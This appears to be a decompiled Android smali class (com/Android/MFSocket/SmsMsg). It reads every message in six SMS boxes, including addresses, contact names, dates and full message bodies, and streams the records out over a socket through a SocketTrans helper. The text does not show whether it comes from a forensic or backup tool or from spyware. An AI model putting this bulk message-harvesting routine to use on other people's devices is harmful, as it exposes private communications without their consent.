.class public Lcom/Android/MFSocket/SmsMsg;
.super Ljava/lang/Object;
.source "SmsMsg.java"


# instance fields
.field public mResolver:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/ContentResolver;)V
    .locals 0
    .param p1, "contentResolver"    # Landroid/content/ContentResolver;

    .prologue
    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 13
    iput-object p1, p0, Lcom/Android/MFSocket/SmsMsg;->mResolver:Landroid/content/ContentResolver;

    .line 14
    return-void
.end method


# virtual methods
.method getSms(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 14
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "smsMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 17
    iget-object v0, p0, Lcom/Android/MFSocket/SmsMsg;->mResolver:Landroid/content/ContentResolver;

    if-nez v0, :cond_1

    .line 53
    :cond_0
    return-void

    .line 23
    :cond_1
    const/4 v0, 0x6

    new-array v12, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    .line 24
    const-string v3, "content://sms/inbox"

    aput-object v3, v12, v0

    const/4 v0, 0x1

    .line 25
    const-string v3, "content://sms/sent"

    aput-object v3, v12, v0

    const/4 v0, 0x2

    .line 26
    const-string v3, "content://sms/draft"

    aput-object v3, v12, v0

    const/4 v0, 0x3

    .line 27
    const-string v3, "content://sms/outbox"

    aput-object v3, v12, v0

    const/4 v0, 0x4

    .line 28
    const-string v3, "content://sms/failed"

    aput-object v3, v12, v0

    const/4 v0, 0x5

    .line 29
    const-string v3, "content://sms/queued"

    aput-object v3, v12, v0

    .line 30
    .local v12, "smsBox":[Ljava/lang/String;
    const/16 v0, 0x8

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v3, "address"

    aput-object v3, v2, v0

    const/4 v0, 0x1

    const-string v3, "person"

    aput-object v3, v2, v0

    const/4 v0, 0x2

    const-string v3, "date"

    aput-object v3, v2, v0

    const/4 v0, 0x3

    const-string v3, "protocol"

    aput-object v3, v2, v0

    const/4 v0, 0x4

    const-string v3, "read"

    aput-object v3, v2, v0

    const/4 v0, 0x5

    const-string v3, "type"

    aput-object v3, v2, v0

    const/4 v0, 0x6

    const-string v3, "subject"

    aput-object v3, v2, v0

    const/4 v0, 0x7

    const-string v3, "body"

    aput-object v3, v2, v0

    .line 32
    .local v2, "projection":[Ljava/lang/String;
    const/4 v13, 0x0

    .line 33
    .local v13, "smsCount":I
    const/4 v10, 0x0

    .local v10, "i":I
    :goto_0
    const/4 v0, 0x6

    if-lt v10, v0, :cond_2

    .line 42
    new-instance v9, Ljava/lang/StringBuffer;

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    .line 43
    .local v9, "count":Ljava/lang/StringBuffer;
    invoke-virtual {v9, v13}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 44
    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 46
    const/4 v11, 0x0

    .local v11, "j":I
    :goto_1
    const/4 v0, 0x6

    if-ge v11, v0, :cond_0

    .line 48
    aget-object v0, v12, v11

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 49
    .local v1, "uri":Landroid/net/Uri;
    iget-object v0, p0, Lcom/Android/MFSocket/SmsMsg;->mResolver:Landroid/content/ContentResolver;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "date desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    .local v5, "cur":Landroid/database/Cursor;
    move-object v3, p0

    move-object v4, p1

    move-object v6, v1

    move-object/from16 v7, p2

    move/from16 v8, p3

    .line 50
    invoke-virtual/range {v3 .. v8}, Lcom/Android/MFSocket/SmsMsg;->getSmsOneBox(Ljava/io/BufferedOutputStream;Landroid/database/Cursor;Landroid/net/Uri;Ljava/lang/StringBuffer;I)V

    .line 51
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 46
    add-int/lit8 v11, v11, 0x1

    goto :goto_1

    .line 35
    .end local v1    # "uri":Landroid/net/Uri;
    .end local v5    # "cur":Landroid/database/Cursor;
    .end local v9    # "count":Ljava/lang/StringBuffer;
    .end local v11    # "j":I
    :cond_2
    aget-object v0, v12, v10

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 36
    .restart local v1    # "uri":Landroid/net/Uri;
    iget-object v0, p0, Lcom/Android/MFSocket/SmsMsg;->mResolver:Landroid/content/ContentResolver;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-string v5, "date desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    .line 37
    .restart local v5    # "cur":Landroid/database/Cursor;
    invoke-interface {v5}, Landroid/database/Cursor;->getCount()I

    move-result v0

    add-int/2addr v13, v0

    .line 38
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .line 33
    add-int/lit8 v10, v10, 0x1

    goto :goto_0
.end method

.method getSmsOneBox(Ljava/io/BufferedOutputStream;Landroid/database/Cursor;Landroid/net/Uri;Ljava/lang/StringBuffer;I)V
    .locals 21
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "cur"    # Landroid/database/Cursor;
    .param p3, "uri"    # Landroid/net/Uri;
    .param p4, "smsMsg"    # Ljava/lang/StringBuffer;
    .param p5, "oneTimeCount"    # I

    .prologue
    .line 57
    if-eqz p2, :cond_0

    if-nez p3, :cond_1

    .line 118
    :cond_0
    :goto_0
    return-void

    .line 61
    :cond_1
    invoke-interface/range {p2 .. p2}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v20

    if-eqz v20, :cond_4

    .line 62
    const-wide/16 v6, 0x0

    .line 63
    .local v6, "date":J
    const/4 v14, 0x0

    .line 64
    .local v14, "read":I
    const/16 v18, 0x0

    .line 65
    .local v18, "type":I
    const/4 v10, 0x0

    .line 66
    .local v10, "nameIdx":I
    const/4 v8, 0x0

    .line 67
    .local v8, "dateIdx":I
    const/4 v5, 0x0

    .line 68
    .local v5, "bodyIdx":I
    const/16 v19, 0x0

    .line 69
    .local v19, "typeIdx":I
    const/4 v15, 0x0

    .line 70
    .local v15, "readIdx":I
    const/4 v13, 0x0

    .line 71
    .local v13, "prtclIdx":I
    const/4 v12, 0x0

    .line 72
    .local v12, "protocol":I
    const/4 v3, 0x0

    .line 73
    .local v3, "addressIdx":I
    const/16 v17, 0x0

    .line 74
    .local v17, "subjectIdx":I
    const/4 v4, 0x0

    .line 75
    .local v4, "body":Ljava/lang/String;
    const/4 v11, 0x0

    .line 76
    .local v11, "person":Ljava/lang/String;
    const/4 v2, 0x0

    .line 77
    .local v2, "address":Ljava/lang/String;
    const/16 v16, 0x0

    .line 79
    .local v16, "subject":Ljava/lang/String;
    const-string v20, "person"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    .line 80
    const-string v20, "address"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    .line 81
    const-string v20, "date"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    .line 82
    const-string v20, "protocol"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    .line 83
    const-string v20, "read"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    .line 84
    const-string v20, "subject"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v17

    .line 85
    const-string v20, "body"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v5

    .line 86
    const-string v20, "type"

    move-object/from16 v0, p2

    move-object/from16 v1, v20

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v19

    .line 88
    const/4 v9, 0x0

    .line 90
    .local v9, "nSendCount":I
    :cond_2
    move-object/from16 v0, p2

    invoke-interface {v0, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 91
    move-object/from16 v0, p2

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 92
    move-object/from16 v0, p2

    invoke-interface {v0, v8}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    .line 93
    move-object/from16 v0, p2

    move/from16 v1, v17

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 94
    move-object/from16 v0, p2

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    .line 95
    move-object/from16 v0, p2

    move/from16 v1, v19

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v18

    .line 96
    move-object/from16 v0, p2

    invoke-interface {v0, v15}, Landroid/database/Cursor;->getInt(I)I

    move-result v14

    .line 97
    move-object/from16 v0, p2

    invoke-interface {v0, v13}, Landroid/database/Cursor;->getInt(I)I

    move-result v12

    .line 99
    move-object/from16 v0, p4

    invoke-static {v11, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 100
    move-object/from16 v0, p4

    invoke-static {v2, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 101
    move-object/from16 v0, p4

    invoke-static {v6, v7, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 102
    move-object/from16 v0, v16

    move-object/from16 v1, p4

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 103
    move-object/from16 v0, p4

    invoke-static {v4, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 104
    move/from16 v0, v18

    move-object/from16 v1, p4

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 105
    move-object/from16 v0, p4

    invoke-static {v14, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 106
    move-object/from16 v0, p4

    invoke-static {v12, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 107
    invoke-static/range {p4 .. p4}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 109
    rem-int v20, v9, p5

    if-nez v20, :cond_3

    .line 110
    invoke-virtual/range {p4 .. p4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p1

    move-object/from16 v1, v20

    invoke-static {v0, v1}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 111
    const/16 v20, 0x0

    move-object/from16 v0, p4

    move/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 113
    :cond_3
    invoke-interface/range {p2 .. p2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v20

    if-nez v20, :cond_2

    .line 115
    .end local v2    # "address":Ljava/lang/String;
    .end local v3    # "addressIdx":I
    .end local v4    # "body":Ljava/lang/String;
    .end local v5    # "bodyIdx":I
    .end local v6    # "date":J
    .end local v8    # "dateIdx":I
    .end local v9    # "nSendCount":I
    .end local v10    # "nameIdx":I
    .end local v11    # "person":Ljava/lang/String;
    .end local v12    # "protocol":I
    .end local v13    # "prtclIdx":I
    .end local v14    # "read":I
    .end local v15    # "readIdx":I
    .end local v16    # "subject":Ljava/lang/String;
    .end local v17    # "subjectIdx":I
    .end local v18    # "type":I
    .end local v19    # "typeIdx":I
    :cond_4
    invoke-virtual/range {p4 .. p4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, p1

    move-object/from16 v1, v20

    invoke-static {v0, v1}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 116
    const/16 v20, 0x0

    move-object/from16 v0, p4

    move/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 117
    invoke-interface/range {p2 .. p2}, Landroid/database/Cursor;->close()V

    goto/16 :goto_0
.end method
